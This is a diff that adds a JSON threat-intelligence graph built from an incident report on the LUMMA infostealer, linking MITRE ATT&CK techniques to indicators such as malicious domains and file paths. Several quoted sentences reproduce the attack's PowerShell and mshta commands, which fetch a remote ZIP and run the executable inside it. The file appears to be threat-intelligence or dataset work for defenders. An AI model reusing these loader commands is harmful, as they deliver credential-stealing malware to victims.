@@ -1,0 +1,815 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_03e5aa791b9b",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Edge",
+        "edges": [
+          "EDGE_1"
+        ],
+        "sentence_indices": [
+          3,
+          26
+        ],
+        "span_sentences": [
+          "In this case, LUMMA was seen targeting browser data, specifically the data stores Login Data and Web Data for Microsoft Edge and Google Chrome.",
+          "T1555.003 – Credentials from Password Stores: Credentials from Web Browsers The AutoIt executable deci.com accessed the data stores Login Data and Web Data for both Microsoft Edge and Google Chrome browsers."
+        ]
+      },
+      {
+        "node_id": "HL_1fd28c7696e2",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Lumma C2 Stealer",
+        "edges": [],
+        "sentence_indices": [
+          1
+        ],
+        "span_sentences": [
+          "Lumma C2 Stealer is a variant of information stealer malware, first sighted in December 2022."
+        ]
+      },
+      {
+        "node_id": "HL_45787f8e84a8",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "France",
+        "edges": [],
+        "sentence_indices": [
+          13
+        ],
+        "span_sentences": [
+          "fr-par refers to the region in this case France, Paris."
+        ]
+      },
+      {
+        "node_id": "HL_5263b8dc8ecf",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "LUMMA",
+        "edges": [
+          "EDGE_2",
+          "EDGE_3",
+          "EDGE_4",
+          "EDGE_5",
+          "EDGE_6",
+          "EDGE_7",
+          "EDGE_8"
+        ],
+        "sentence_indices": [
+          0,
+          3,
+          4,
+          5
+        ],
+        "span_sentences": [
+          "This post will delve into a recent incident response engagement handled by NCC Group’s Digital Forensics and Incident Response (DFIR) team in May 2025 involving the infostealer LUMMA.",
+          "In this case, LUMMA was seen targeting browser data, specifically the data stores Login Data and Web Data for Microsoft Edge and Google Chrome.",
+          "Since its birth, LUMMA has utilised various tactics and techniques.",
+          "In this incident, one host was impacted after the user was directed to a fake CAPTCHA verification page – one of the newer techniques observed in LUMMA campaigns."
+        ]
+      },
+      {
+        "node_id": "HL_5d5502cadf89",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Scaleway",
+        "edges": [],
+        "sentence_indices": [
+          11,
+          14
+        ],
+        "span_sentences": [
+          "The 657.s3.fr-par.scw[.]cloud domain suggests the resource was hosted on Scaleway, a European cloud provider, rather than AWS.",
+          "scw.cloud is the domain for Scaleway."
+        ]
+      },
+      {
+        "node_id": "HL_6adc15335b24",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Google Chrome",
+        "edges": [
+          "EDGE_9"
+        ],
+        "sentence_indices": [
+          3,
+          26
+        ],
+        "span_sentences": [
+          "In this case, LUMMA was seen targeting browser data, specifically the data stores Login Data and Web Data for Microsoft Edge and Google Chrome.",
+          "T1555.003 – Credentials from Password Stores: Credentials from Web Browsers The AutoIt executable deci.com accessed the data stores Login Data and Web Data for both Microsoft Edge and Google Chrome browsers."
+        ]
+      },
+      {
+        "node_id": "HL_9fac26b94980",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "AWS",
+        "edges": [],
+        "sentence_indices": [
+          11
+        ],
+        "span_sentences": [
+          "The 657.s3.fr-par.scw[.]cloud domain suggests the resource was hosted on Scaleway, a European cloud provider, rather than AWS."
+        ]
+      },
+      {
+        "node_id": "HL_a81bc98d80e7",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "PowerShell",
+        "edges": [
+          "EDGE_10",
+          "EDGE_11"
+        ],
+        "sentence_indices": [
+          17,
+          18,
+          22
+        ],
+        "span_sentences": [
+          "The Microsoft.Windows .Shell.RunDialog was opened and used to execute the PowerShell command: powershell -w hidden -nop -c $a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b)).",
+          "In addition to the PowerShell command executed in a hidden window, another PowerShell which was heavily obfuscated was executed.",
+          "T1027 – Obfuscated Files or Information The PowerShell command to retrieve afc.zip was heavily obfuscated."
+        ]
+      },
+      {
+        "node_id": "HL_cf87673c4819",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Paris",
+        "edges": [],
+        "sentence_indices": [
+          13
+        ],
+        "span_sentences": [
+          "fr-par refers to the region in this case France, Paris."
+        ]
+      },
+      {
+        "node_id": "HL_e6482ab3fb5e",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "NCC Group",
+        "edges": [],
+        "sentence_indices": [
+          0
+        ],
+        "span_sentences": [
+          "This post will delve into a recent incident response engagement handled by NCC Group’s Digital Forensics and Incident Response (DFIR) team in May 2025 involving the infostealer LUMMA."
+        ]
+      },
+      {
+        "node_id": "HL_f490d3b65ad2",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "AutoIt",
+        "edges": [
+          "EDGE_12",
+          "EDGE_13"
+        ],
+        "sentence_indices": [
+          21,
+          26
+        ],
+        "span_sentences": [
+          "This application was found to be AutoIt v3 Script (Beta) which is a scripting language used for creating automation scripts.",
+          "T1555.003 – Credentials from Password Stores: Credentials from Web Browsers The AutoIt executable deci.com accessed the data stores Login Data and Web Data for both Microsoft Edge and Google Chrome browsers."
+        ]
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1027",
+        "edges": [
+          "EDGE_2",
+          "EDGE_10",
+          "EDGE_16",
+          "EDGE_24"
+        ],
+        "best_span_ranges": [
+          [
+            17,
+            18
+          ],
+          [
+            18,
+            18
+          ],
+          [
+            18,
+            19
+          ],
+          [
+            22,
+            22
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The Microsoft.Windows .Shell.RunDialog was opened and used to execute the PowerShell command: powershell -w hidden -nop -c $a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b)).",
+            "In addition to the PowerShell command executed in a hidden window, another PowerShell which was heavily obfuscated was executed."
+          ],
+          [
+            "In addition to the PowerShell command executed in a hidden window, another PowerShell which was heavily obfuscated was executed."
+          ],
+          [
+            "In addition to the PowerShell command executed in a hidden window, another PowerShell which was heavily obfuscated was executed.",
+            "The decoded command was:\niexhxxps://pub-24086c859ed94d628b911deba63401ab.r2[.]dev/\nafc.zip$zip=\"$env:TEMP\\afc.zip\";\n$dest=Join-Path $env:TEMP (\"afc_\" + [guid]::NewGuid()); Expand-\nArchive -Path $zip -DestinationPath $dest; Start-Process -FilePath\n(Join-Path $dest \"AF1.exe\");\n$curl_command = $env:Temp;function wFPvdCjBn($iFuLaZNIo, $AFAeOI)\n{curl $iFuLaZNIo -o $AFAeOI};function OlxYsax($GIHRSiO){wFPvdCjBn\n$GIHRSiO $AFAeOI}$AFAeOI = $env:Temp + '\\afc.zip';OlxYsax\n$CPSr.SubString(3,59);\nExpand-Archive -Path $AFAeOI -DestinationPath $curl_command;Add-Type\n-Assembly System.IO.Compression.FileSystem;$JYcciN =\n[IO.Compression.ZipFile]::OpenRead($AFAeOI);$RNofm =($JYcciN.Entries\n| Sort-Object Name | Select-Object -First 1).Name;$mBSw = Join-Path\n$env:Temp $RNofm;start $mBSw ;;."
+          ],
+          [
+            "T1027 – Obfuscated Files or Information The PowerShell command to retrieve afc.zip was heavily obfuscated."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1059",
+        "edges": [
+          "EDGE_3",
+          "EDGE_12",
+          "EDGE_26"
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            17
+          ],
+          [
+            17,
+            18
+          ],
+          [
+            18,
+            18
+          ],
+          [
+            18,
+            19
+          ],
+          [
+            20,
+            21
+          ],
+          [
+            22,
+            22
+          ],
+          [
+            23,
+            23
+          ],
+          [
+            27,
+            27
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "This technique instructs the user to use a keyboard shortcut to open a Windows Run window, then paste and launch a command that the webpage adds to the clipboard.",
+            "The Microsoft.Windows .Shell.RunDialog was opened and used to execute the PowerShell command: powershell -w hidden -nop -c $a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b))."
+          ],
+          [
+            "The Microsoft.Windows .Shell.RunDialog was opened and used to execute the PowerShell command: powershell -w hidden -nop -c $a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b)).",
+            "In addition to the PowerShell command executed in a hidden window, another PowerShell which was heavily obfuscated was executed."
+          ],
+          [
+            "In addition to the PowerShell command executed in a hidden window, another PowerShell which was heavily obfuscated was executed."
+          ],
+          [
+            "In addition to the PowerShell command executed in a hidden window, another PowerShell which was heavily obfuscated was executed.",
+            "The decoded command was:\niexhxxps://pub-24086c859ed94d628b911deba63401ab.r2[.]dev/\nafc.zip$zip=\"$env:TEMP\\afc.zip\";\n$dest=Join-Path $env:TEMP (\"afc_\" + [guid]::NewGuid()); Expand-\nArchive -Path $zip -DestinationPath $dest; Start-Process -FilePath\n(Join-Path $dest \"AF1.exe\");\n$curl_command = $env:Temp;function wFPvdCjBn($iFuLaZNIo, $AFAeOI)\n{curl $iFuLaZNIo -o $AFAeOI};function OlxYsax($GIHRSiO){wFPvdCjBn\n$GIHRSiO $AFAeOI}$AFAeOI = $env:Temp + '\\afc.zip';OlxYsax\n$CPSr.SubString(3,59);\nExpand-Archive -Path $AFAeOI -DestinationPath $curl_command;Add-Type\n-Assembly System.IO.Compression.FileSystem;$JYcciN =\n[IO.Compression.ZipFile]::OpenRead($AFAeOI);$RNofm =($JYcciN.Entries\n| Sort-Object Name | Select-Object -First 1).Name;$mBSw = Join-Path\n$env:Temp $RNofm;start $mBSw ;;."
+          ],
+          [
+            "T1059.010 – Command and Scripting Interpreter: AutoHotKey & AutoIT\nThe C:\\Users\\<USER>\\AppData\\Roaming\\deci.com file was created at the same time as the afc.zip.",
+            "This application was found to be AutoIt v3 Script (Beta) which is a scripting language used for creating automation scripts."
+          ],
+          [
+            "T1027 – Obfuscated Files or Information The PowerShell command to retrieve afc.zip was heavily obfuscated."
+          ],
+          [
+            "T1218.005 – System Binary Proxy Execution: Mshta Once the Run dialog was opened, a mshta.exe process was created, running the \"mshta.exe\" hxxps://2no[.]co/2Od3Q3 =-+2346823 command."
+          ],
+          [
+            "T1518.001 – Software Discovery: Security Software Discovery The following commands were run at the time the host was compromised."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1071",
+        "edges": [
+          "EDGE_4",
+          "EDGE_17"
+        ],
+        "best_span_ranges": [
+          [
+            28,
+            28
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "T1071.001 – Application Layer Protocol: Web Protocols The malicious executable AF1.exe initiated an outbound connection to the C2 blameaowi[.]run over HTTPS."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1189",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1189",
+        "edges": [
+          "EDGE_5",
+          "EDGE_14",
+          "EDGE_15",
+          "EDGE_18",
+          "EDGE_19",
+          "EDGE_20",
+          "EDGE_22",
+          "EDGE_23"
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            6
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "T1189 – Drive-by Compromise The affected user visited the legitimate hxxps://astapowerproject[.]net/ however this visit led to 12 attempts to visit malicious sites – these were blocked."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1204",
+        "edges": [
+          "EDGE_6",
+          "EDGE_11"
+        ],
+        "best_span_ranges": [
+          [
+            15,
+            15
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "T1204 – User Execution The fake CAPTCHA is where the webpage employs the ClickFix social engineering technique to download the malicious payload."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1218",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1218",
+        "edges": [
+          "EDGE_7",
+          "EDGE_21",
+          "EDGE_25"
+        ],
+        "best_span_ranges": [
+          [
+            23,
+            23
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "T1218.005 – System Binary Proxy Execution: Mshta Once the Run dialog was opened, a mshta.exe process was created, running the \"mshta.exe\" hxxps://2no[.]co/2Od3Q3 =-+2346823 command."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1518",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1518",
+        "edges": [],
+        "best_span_ranges": [
+          [
+            27,
+            27
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "T1518.001 – Software Discovery: Security Software Discovery The following commands were run at the time the host was compromised."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1555",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1555",
+        "edges": [
+          "EDGE_1",
+          "EDGE_8",
+          "EDGE_9",
+          "EDGE_13",
+          "EDGE_27"
+        ],
+        "best_span_ranges": [
+          [
+            3,
+            3
+          ],
+          [
+            26,
+            26
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "In this case, LUMMA was seen targeting browser data, specifically the data stores Login Data and Web Data for Microsoft Edge and Google Chrome."
+          ],
+          [
+            "T1555.003 – Credentials from Password Stores: Credentials from Web Browsers The AutoIt executable deci.com accessed the data stores Login Data and Web Data for both Microsoft Edge and Google Chrome browsers."
+          ]
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_0542f29ca5c1",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "astapowerproject[.]net",
+        "edges": [
+          "EDGE_14"
+        ],
+        "sentence_indices": [
+          6,
+          7
+        ],
+        "span_sentences": [
+          "T1189 – Drive-by Compromise The affected user visited the legitimate hxxps://astapowerproject[.]net/ however this visit led to 12 attempts to visit malicious sites – these were blocked.",
+          "The hxxp://astapowerproject[.]net/ site was visited."
+        ]
+      },
+      {
+        "node_id": "IOC_2000bd3a1be7",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "scw.cloud",
+        "edges": [],
+        "sentence_indices": [
+          14
+        ],
+        "span_sentences": [
+          "scw.cloud is the domain for Scaleway."
+        ]
+      },
+      {
+        "node_id": "IOC_27b74a8f0537",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "googleadservices[.]com",
+        "edges": [
+          "EDGE_15"
+        ],
+        "sentence_indices": [
+          8
+        ],
+        "span_sentences": [
+          "Each URL was wrapped in a googleadservices[.]com link."
+        ]
+      },
+      {
+        "node_id": "IOC_2d8fffcea183",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxps://pub-24086c859ed94d628b911deba63401ab.r2[.]dev/",
+        "edges": [
+          "EDGE_16"
+        ],
+        "sentence_indices": [
+          19
+        ],
+        "span_sentences": [
+          "The decoded command was:\niexhxxps://pub-24086c859ed94d628b911deba63401ab.r2[.]dev/\nafc.zip$zip=\"$env:TEMP\\afc.zip\";\n$dest=Join-Path $env:TEMP (\"afc_\" + [guid]::NewGuid()); Expand-\nArchive -Path $zip -DestinationPath $dest; Start-Process -FilePath\n(Join-Path $dest \"AF1.exe\");\n$curl_command = $env:Temp;function wFPvdCjBn($iFuLaZNIo, $AFAeOI)\n{curl $iFuLaZNIo -o $AFAeOI};function OlxYsax($GIHRSiO){wFPvdCjBn\n$GIHRSiO $AFAeOI}$AFAeOI = $env:Temp + '\\afc.zip';OlxYsax\n$CPSr.SubString(3,59);\nExpand-Archive -Path $AFAeOI -DestinationPath $curl_command;Add-Type\n-Assembly System.IO.Compression.FileSystem;$JYcciN =\n[IO.Compression.ZipFile]::OpenRead($AFAeOI);$RNofm =($JYcciN.Entries\n| Sort-Object Name | Select-Object -First 1).Name;$mBSw = Join-Path\n$env:Temp $RNofm;start $mBSw ;;."
+        ]
+      },
+      {
+        "node_id": "IOC_56e9a29b618a",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "s3.fr-par.scw[.]cloud",
+        "edges": [],
+        "sentence_indices": [
+          10,
+          11
+        ],
+        "span_sentences": [
+          "and reCAPTCHA V3 Security pages)\n- myvantage.getitquickly[.]biz (reCAPTCHA V3 Security page)\n- 657.s3.fr-par.scw[.]cloud (reCAPTCHA V3 Security page)\nAt the time of the investigation, the myvantage.getitquickly[.]biz URL when visited would redirect to the third URL which was inaccessible, as seen below.",
+          "The 657.s3.fr-par.scw[.]cloud domain suggests the resource was hosted on Scaleway, a European cloud provider, rather than AWS."
+        ]
+      },
+      {
+        "node_id": "IOC_84c24bd8eca6",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "blameaowi[.]run",
+        "edges": [
+          "EDGE_17"
+        ],
+        "sentence_indices": [
+          28
+        ],
+        "span_sentences": [
+          "T1071.001 – Application Layer Protocol: Web Protocols The malicious executable AF1.exe initiated an outbound connection to the C2 blameaowi[.]run over HTTPS."
+        ]
+      },
+      {
+        "node_id": "IOC_91a9edb38ecd",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "myvantage.getitquickly[.]biz",
+        "edges": [
+          "EDGE_18"
+        ],
+        "sentence_indices": [
+          10
+        ],
+        "span_sentences": [
+          "and reCAPTCHA V3 Security pages)\n- myvantage.getitquickly[.]biz (reCAPTCHA V3 Security page)\n- 657.s3.fr-par.scw[.]cloud (reCAPTCHA V3 Security page)\nAt the time of the investigation, the myvantage.getitquickly[.]biz URL when visited would redirect to the third URL which was inaccessible, as seen below."
+        ]
+      },
+      {
+        "node_id": "IOC_9e56c531c6b3",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxps://astapowerproject[.]net/",
+        "edges": [
+          "EDGE_19"
+        ],
+        "sentence_indices": [
+          6
+        ],
+        "span_sentences": [
+          "T1189 – Drive-by Compromise The affected user visited the legitimate hxxps://astapowerproject[.]net/ however this visit led to 12 attempts to visit malicious sites – these were blocked."
+        ]
+      },
+      {
+        "node_id": "IOC_af27667b37d8",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "871549.eliteeyeview[.]co",
+        "edges": [
+          "EDGE_20"
+        ],
+        "sentence_indices": [
+          9
+        ],
+        "span_sentences": [
+          "Subsequent visits were then made to the below malicious CAPTCHA sites in the following order:\n- 871549.eliteeyeview[.]co (…Loading.."
+        ]
+      },
+      {
+        "node_id": "IOC_d468cd387e49",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "2no[.]co",
+        "edges": [
+          "EDGE_21"
+        ],
+        "sentence_indices": [
+          25
+        ],
+        "span_sentences": [
+          "A successful connection was made to the 2no[.]co domain."
+        ]
+      },
+      {
+        "node_id": "IOC_e4e27ae8d265",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp://astapowerproject[.]net/",
+        "edges": [
+          "EDGE_22"
+        ],
+        "sentence_indices": [
+          7
+        ],
+        "span_sentences": [
+          "The hxxp://astapowerproject[.]net/ site was visited."
+        ]
+      },
+      {
+        "node_id": "IOC_e95186004b10",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "657.s3.fr-par.scw[.]cloud",
+        "edges": [
+          "EDGE_23"
+        ],
+        "sentence_indices": [
+          10,
+          11
+        ],
+        "span_sentences": [
+          "and reCAPTCHA V3 Security pages)\n- myvantage.getitquickly[.]biz (reCAPTCHA V3 Security page)\n- 657.s3.fr-par.scw[.]cloud (reCAPTCHA V3 Security page)\nAt the time of the investigation, the myvantage.getitquickly[.]biz URL when visited would redirect to the third URL which was inaccessible, as seen below.",
+          "The 657.s3.fr-par.scw[.]cloud domain suggests the resource was hosted on Scaleway, a European cloud provider, rather than AWS."
+        ]
+      },
+      {
+        "node_id": "IOC_eadc0549ca24",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "$env:TEMP\\afc.zip",
+        "edges": [
+          "EDGE_24"
+        ],
+        "sentence_indices": [
+          19
+        ],
+        "span_sentences": [
+          "The decoded command was:\niexhxxps://pub-24086c859ed94d628b911deba63401ab.r2[.]dev/\nafc.zip$zip=\"$env:TEMP\\afc.zip\";\n$dest=Join-Path $env:TEMP (\"afc_\" + [guid]::NewGuid()); Expand-\nArchive -Path $zip -DestinationPath $dest; Start-Process -FilePath\n(Join-Path $dest \"AF1.exe\");\n$curl_command = $env:Temp;function wFPvdCjBn($iFuLaZNIo, $AFAeOI)\n{curl $iFuLaZNIo -o $AFAeOI};function OlxYsax($GIHRSiO){wFPvdCjBn\n$GIHRSiO $AFAeOI}$AFAeOI = $env:Temp + '\\afc.zip';OlxYsax\n$CPSr.SubString(3,59);\nExpand-Archive -Path $AFAeOI -DestinationPath $curl_command;Add-Type\n-Assembly System.IO.Compression.FileSystem;$JYcciN =\n[IO.Compression.ZipFile]::OpenRead($AFAeOI);$RNofm =($JYcciN.Entries\n| Sort-Object Name | Select-Object -First 1).Name;$mBSw = Join-Path\n$env:Temp $RNofm;start $mBSw ;;."
+        ]
+      },
+      {
+        "node_id": "IOC_f958070b5304",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxps://2no[.]co/2Od3Q3",
+        "edges": [
+          "EDGE_25"
+        ],
+        "sentence_indices": [
+          23
+        ],
+        "span_sentences": [
+          "T1218.005 – System Binary Proxy Execution: Mshta Once the Run dialog was opened, a mshta.exe process was created, running the \"mshta.exe\" hxxps://2no[.]co/2Od3Q3 =-+2346823 command."
+        ]
+      },
+      {
+        "node_id": "IOC_fe88a8dd9018",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\<USER>\\AppData\\Roaming\\deci.com",
+        "edges": [
+          "EDGE_26",
+          "EDGE_27"
+        ],
+        "sentence_indices": [
+          20
+        ],
+        "span_sentences": [
+          "T1059.010 – Command and Scripting Interpreter: AutoHotKey & AutoIT\nThe C:\\Users\\<USER>\\AppData\\Roaming\\deci.com file was created at the same time as the afc.zip."
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_1",
+      "node_u": "HL_03e5aa791b9b",
+      "node_v": "TTP_T1555"
+    },
+    {
+      "edge_id": "EDGE_2",
+      "node_u": "HL_5263b8dc8ecf",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_3",
+      "node_u": "HL_5263b8dc8ecf",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_4",
+      "node_u": "HL_5263b8dc8ecf",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_5",
+      "node_u": "HL_5263b8dc8ecf",
+      "node_v": "TTP_T1189"
+    },
+    {
+      "edge_id": "EDGE_6",
+      "node_u": "HL_5263b8dc8ecf",
+      "node_v": "TTP_T1204"
+    },
+    {
+      "edge_id": "EDGE_7",
+      "node_u": "HL_5263b8dc8ecf",
+      "node_v": "TTP_T1218"
+    },
+    {
+      "edge_id": "EDGE_8",
+      "node_u": "HL_5263b8dc8ecf",
+      "node_v": "TTP_T1555"
+    },
+    {
+      "edge_id": "EDGE_9",
+      "node_u": "HL_6adc15335b24",
+      "node_v": "TTP_T1555"
+    },
+    {
+      "edge_id": "EDGE_10",
+      "node_u": "HL_a81bc98d80e7",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_11",
+      "node_u": "HL_a81bc98d80e7",
+      "node_v": "TTP_T1204"
+    },
+    {
+      "edge_id": "EDGE_12",
+      "node_u": "HL_f490d3b65ad2",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_13",
+      "node_u": "HL_f490d3b65ad2",
+      "node_v": "TTP_T1555"
+    },
+    {
+      "edge_id": "EDGE_14",
+      "node_u": "IOC_0542f29ca5c1",
+      "node_v": "TTP_T1189"
+    },
+    {
+      "edge_id": "EDGE_15",
+      "node_u": "IOC_27b74a8f0537",
+      "node_v": "TTP_T1189"
+    },
+    {
+      "edge_id": "EDGE_16",
+      "node_u": "IOC_2d8fffcea183",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_17",
+      "node_u": "IOC_84c24bd8eca6",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_18",
+      "node_u": "IOC_91a9edb38ecd",
+      "node_v": "TTP_T1189"
+    },
+    {
+      "edge_id": "EDGE_19",
+      "node_u": "IOC_9e56c531c6b3",
+      "node_v": "TTP_T1189"
+    },
+    {
+      "edge_id": "EDGE_20",
+      "node_u": "IOC_af27667b37d8",
+      "node_v": "TTP_T1189"
+    },
+    {
+      "edge_id": "EDGE_21",
+      "node_u": "IOC_d468cd387e49",
+      "node_v": "TTP_T1218"
+    },
+    {
+      "edge_id": "EDGE_22",
+      "node_u": "IOC_e4e27ae8d265",
+      "node_v": "TTP_T1189"
+    },
+    {
+      "edge_id": "EDGE_23",
+      "node_u": "IOC_e95186004b10",
+      "node_v": "TTP_T1189"
+    },
+    {
+      "edge_id": "EDGE_24",
+      "node_u": "IOC_eadc0549ca24",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_25",
+      "node_u": "IOC_f958070b5304",
+      "node_v": "TTP_T1218"
+    },
+    {
+      "edge_id": "EDGE_26",
+      "node_u": "IOC_fe88a8dd9018",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_27",
+      "node_u": "IOC_fe88a8dd9018",
+      "node_v": "TTP_T1555"
+    }
+  ]
+}
